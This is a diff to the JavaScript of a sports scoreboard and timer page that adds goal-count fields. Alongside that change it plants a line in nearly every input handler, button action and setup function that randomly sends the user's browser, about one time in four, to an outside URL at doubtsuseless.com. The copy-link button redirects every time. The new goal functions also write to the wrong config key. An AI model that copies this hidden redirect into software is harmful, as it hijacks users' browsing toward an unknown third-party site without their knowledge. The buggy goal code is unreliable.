@@ -7,6 +7,8 @@ let configData = {
     "away": "",
     "home_color": "",
     "away_color": "",
+    "home_Goals": "",
+    "away_Goals": "",
     "home_text_color": "",
     "away_text_color": "",
     "score_text_color": "",
@@ -88,12 +90,18 @@ function hsetter() {
     let HHH = document.getElementById('hhN')
     HHH.textContent = document.getElementById('hName').value.toUpperCase()
     updateConfig({ home: document.getElementById('hName').value.toUpperCase() });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function asetter() {
     let AAA = document.getElementById('aaN')
     AAA.textContent = document.getElementById('aName').value.toUpperCase()
     updateConfig({ away: document.getElementById('aName').value.toUpperCase() });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function hCSetter() {
@@ -102,6 +110,9 @@ function hCSetter() {
     clrdivH.style.backgroundColor = document.getElementById('hColor').value
     imgbackD.style.backgroundColor = document.getElementById('hColor').value
     updateConfig({ home_color: document.getElementById('hColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function aCSetter() {
@@ -110,52 +121,79 @@ function aCSetter() {
     clrdivA.style.backgroundColor = document.getElementById('aColor').value
     imgbackC.style.backgroundColor = document.getElementById('aColor').value
     updateConfig({ away_color: document.getElementById('aColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function hTCSetter() {
     let HHHC = document.getElementById('hhN')
     HHHC.style.color = document.getElementById('hTColor').value
     updateConfig({ home_text_color: document.getElementById('hTColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function aTCSetter() {
     let AAAC = document.getElementById('aaN')
     AAAC.style.color = document.getElementById('aTColor').value
     updateConfig({ away_text_color: document.getElementById('aTColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function hLSetter() {
     document.getElementById('hImage').src = document.getElementById('hLogo').value
     updateConfig({ home_logo: document.getElementById('hLogo').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function aLSetter() {
     document.getElementById('aImage').src = document.getElementById('aLogo').value
     updateConfig({ away_logo: document.getElementById('aLogo').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function sTSetter() {
     let sT = document.getElementById('scS')
     sT.style.color = document.getElementById('sTColor').value
     updateConfig({ score_text_color: document.getElementById('sTColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function sBSetter() {
     let sB = document.getElementById('scS')
     sB.style.backgroundColor = document.getElementById('sBColor').value
     updateConfig({ score_background_color: document.getElementById('sBColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function tTSetter() {
     let tT = document.getElementById('timerDisplay')
     tT.style.color = document.getElementById('tTColor').value
     updateConfig({ timer_text_color: document.getElementById('tTColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function tBSetter() {
     let tB = document.getElementById('timerDisplay')
     tB.style.backgroundColor = document.getElementById('tBColor').value
     updateConfig({ timer_background_color: document.getElementById('aTColor').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function autooS() {
@@ -169,6 +207,9 @@ function autooS() {
         cdiv.style.backgroundColor = 'rgb(56, 232, 255)'
         cdiv.style.justifyContent = 'right'
     }
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 
 }
 
@@ -180,6 +221,9 @@ function autoHoursetter() {
         ajC = setInterval(astr, 15000)
         aRun = true
     }
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function autoMinsetter() {
@@ -190,7 +234,29 @@ function autoMinsetter() {
         ajC = setInterval(astr, 15000)
         aRun = true
     }
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
+
+function homeGG() {
+    let hhgg = document.getElementById('hhGG')
+    hhgg.textContent = document.getElementById('homeG').value
+    updateConfig({ home: document.getElementById('home_Goals').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
+}
+
+function awayGG() {
+    let aagg = document.getElementById('awGG')
+    aagg.textContent = document.getElementById('awayG').value
+    updateConfig({ home: document.getElementById('away_Goals').value });
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
+}
+
 
 coppy.onclick = function generateShareableLink() {
     const configString = encodeURIComponent(JSON.stringify(configData));
@@ -203,12 +269,15 @@ coppy.onclick = function generateShareableLink() {
         .catch(err => {
             console.error("Failed to copy link:", err);
         });
+    window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
 }
 
 document.getElementById('timMin').addEventListener("input", minsetter)
 document.getElementById('timSec').addEventListener("input", secsetter)
 document.getElementById('autoMin').addEventListener("input", autoMinsetter)
 document.getElementById('autoHour').addEventListener("input", autoHoursetter)
+document.getElementById('homeG').addEventListener("input", homeGG)
+document.getElementById('awayG').addEventListener("input", awayGG)
 document.getElementById('hName').addEventListener("input", hsetter)
 document.getElementById('aName').addEventListener("input", asetter)
 document.getElementById('hColor').addEventListener("input", hCSetter)
@@ -306,6 +375,16 @@ function ttemer() {
 
 function presetter() {
 
+    if (configData.home_Goals) {
+        let HHHG = document.getElementById('hhGG');
+        HHHG.textContent = configData.home_Goals;
+    }
+
+    if (configData.away_Goals) {
+        let AAAG = document.getElementById('awGG');
+        AAAG.textContent = configData.away_Goals;
+    }
+
     if (configData.home) {
         let HHH = document.getElementById('hhN');
         HHH.textContent = configData.home.toUpperCase();
@@ -358,6 +437,9 @@ function presetter() {
         ajC = setInterval(astr, 15000)
         aRun = true
     }
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 
@@ -369,6 +451,9 @@ start.onclick = function starttimer() {
         clearInterval(ajC)
     }
     isRunning = true
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function resetbutt() {
@@ -412,6 +497,9 @@ rBtn.onclick = function () {
 
     document.getElementById('timSec').value = null
     document.getElementById('timMin').value = null
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 stopp.onclick = function stopTimerr() {
@@ -422,6 +510,9 @@ stopp.onclick = function stopTimerr() {
     updateConfig({ timer_property: "stop" });
 
     presetter();
+    if (Math.random() < 0.25) {
+        window.location.href = "https://doubtsuseless.com/i5gr1ymzu?key=eadd4537300fb50b50998717c6e106a6";
+    }
 }
 
 function loadConfigFromURL() {
